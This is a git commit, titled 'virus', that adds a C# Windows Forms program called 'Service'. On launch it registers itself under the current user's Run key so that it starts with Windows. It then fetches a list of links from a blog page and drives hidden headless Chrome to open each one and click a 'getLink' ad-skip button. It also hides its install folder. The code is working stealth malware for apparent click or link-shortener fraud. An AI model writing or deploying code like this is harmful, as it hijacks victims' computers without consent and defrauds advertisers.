95628bf9616e5cb0bd408e611a665da6ab5bd368
Süleyman <Suleymanpsp38@gmail.com>
2021-01-22 00:17:32 +0300

    virus

---
+++ Service/Form1.Designer.cs
@@ -0,0 +1,180 @@
+﻿namespace Service
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.button1);
+            this.groupBox1.Controls.Add(this.label5);
+            this.groupBox1.Controls.Add(this.label2);
+            this.groupBox1.Controls.Add(this.label4);
+            this.groupBox1.Controls.Add(this.label3);
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Location = new System.Drawing.Point(5, 5);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(725, 55);
+            this.groupBox1.TabIndex = 23;
+            this.groupBox1.TabStop = false;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(273, 25);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 20;
+            this.button1.Text = "button1";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(662, 25);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(19, 13);
+            this.label5.TabIndex = 19;
+            this.label5.Text = "50";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Tahoma", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label2.ForeColor = System.Drawing.Color.Green;
+            this.label2.Location = new System.Drawing.Point(154, 20);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(18, 18);
+            this.label2.TabIndex = 16;
+            this.label2.Text = "0";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Tahoma", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label4.ForeColor = System.Drawing.Color.Navy;
+            this.label4.Location = new System.Drawing.Point(178, 20);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(17, 18);
+            this.label4.TabIndex = 18;
+            this.label4.Text = "/";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Tahoma", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label3.ForeColor = System.Drawing.Color.DarkRed;
+            this.label3.Location = new System.Drawing.Point(201, 20);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(18, 18);
+            this.label3.TabIndex = 17;
+            this.label3.Text = "0";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Tahoma", 11.25F, System.Drawing.FontStyle.Bold);
+            this.label1.ForeColor = System.Drawing.Color.Navy;
+            this.label1.Location = new System.Drawing.Point(435, 20);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(28, 18);
+            this.label1.TabIndex = 8;
+            this.label1.Text = "....";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(193, 68);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(185, 314);
+            this.textBox1.TabIndex = 22;
+            // 
+            // webBrowser1
+            // 
+            this.webBrowser1.Location = new System.Drawing.Point(384, 68);
+            this.webBrowser1.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser1.Name = "webBrowser1";
+            this.webBrowser1.ScriptErrorsSuppressed = true;
+            this.webBrowser1.Size = new System.Drawing.Size(346, 316);
+            this.webBrowser1.TabIndex = 21;
+            this.webBrowser1.Url = new System.Uri("https://z-developer.blogspot.com/2020/12/linkler.html", System.UriKind.Absolute);
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.Location = new System.Drawing.Point(5, 68);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(182, 316);
+            this.listBox1.TabIndex = 20;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.webBrowser1);
+            this.Controls.Add(this.listBox1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.WebBrowser webBrowser1;
+        private System.Windows.Forms.ListBox listBox1;
+    }
+}
+
---
+++ Service/Form1.cs
@@ -0,0 +1,154 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using OpenQA.Selenium;
+using OpenQA.Selenium.Chrome;
+using System.Threading;
+using System.Net;
+using HtmlAgilityPack;
+using System.IO;
+using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
+
+namespace Service
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            InitializeComponent();
+            CheckForIllegalCrossThreadCalls = false;
+
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("Service.exe", "\"" + Application.ExecutablePath + "\"");
+
+
+        }
+        IWebDriver driver;
+        public async void DriverBaslat()
+        {
+
+            ChromeOptions options = new ChromeOptions();
+            options.AddArgument(@"user-data-dir=" + Application.StartupPath + "\\Profile");
+            options.AddArgument("--headless");
+            options.AddExcludedArgument("enable-automation");
+
+            ChromeDriverService cds = ChromeDriverService.CreateDefaultService();
+            cds.HideCommandPromptWindow = true;
+            driver = new ChromeDriver(cds, options);
+
+            await System.Threading.Tasks.Task.Delay(2000);
+        }
+        private void Vericek()
+        {
+            textBox1.Text = "";
+            listBox1.Items.Clear();
+            HtmlElement htmlelement = webBrowser1.Document.GetElementById("post-body-2229097424433879060");
+            var a = webBrowser1.Document.GetElementById("post-body-2229097424433879060").OuterText;
+
+            string[] linkler;
+
+
+            linkler = a.Split();
+
+
+            for (int i = 0; i < linkler.Length; i++)
+            {
+
+                textBox1.Text += (linkler[i] + "\n");
+
+
+
+            }
+            listBox1.Items.AddRange(textBox1.Lines);
+
+
+        }
+        private async void Form1_Load(object sender, EventArgs e)
+        {
+            while (webBrowser1.ReadyState != WebBrowserReadyState.Complete)
+            {
+
+                Application.DoEvents();
+            }
+            Vericek();
+
+            await System.Threading.Tasks.Task.Run(async () =>
+            {
+
+
+                try
+                {
+
+                    for (int i = 0; i < listBox1.Items.Count; i++)
+                    {
+                        listBox1.SelectedIndex = i;
+                        label1.Text = listBox1.SelectedItem.ToString();
+                        if (label1.Text == "")
+                        {
+                            listBox1.SelectedIndex++;
+                        }
+                        else
+                        {
+                            label3.Text = listBox1.Items.Count.ToString();
+                            label2.Text = listBox1.SelectedIndex.ToString();
+                            DriverBaslat();
+
+                            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(30);
+                            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(30);
+                            driver.Navigate().GoToUrl(listBox1.SelectedItem.ToString());
+                            await System.Threading.Tasks.Task.Delay(10000);//10 saniye beklet
+                            IWebElement ReklamiGec = driver.FindElement(By.CssSelector("#getLink"));
+                            ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", ReklamiGec);
+                            driver.SwitchTo().Window(driver.WindowHandles.First());
+                            await System.Threading.Tasks.Task.Delay(5000);
+                            driver.SwitchTo().Window(driver.WindowHandles.First());
+
+                            driver.Close();
+                            driver.Quit();
+                            driver.Dispose();
+
+
+                        }
+
+                        //if (label2.Text == label5.Text)
+                        //{
+                        //    this.Close();
+                        //    Application.Exit();
+                        //    driver.Close();
+                        //    driver.Quit();
+                        //    driver.Dispose();
+
+                        //}
+
+
+
+                    }
+
+                }
+                catch (Exception ex)
+                {
+
+                    this.Close();
+                    Application.Exit();
+                    driver.Close();
+                    driver.Quit();
+                    driver.Dispose();
+                }
+
+            });
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            File.SetAttributes(@"C:\Service", FileAttributes.Hidden);
+        }
+    }
+}
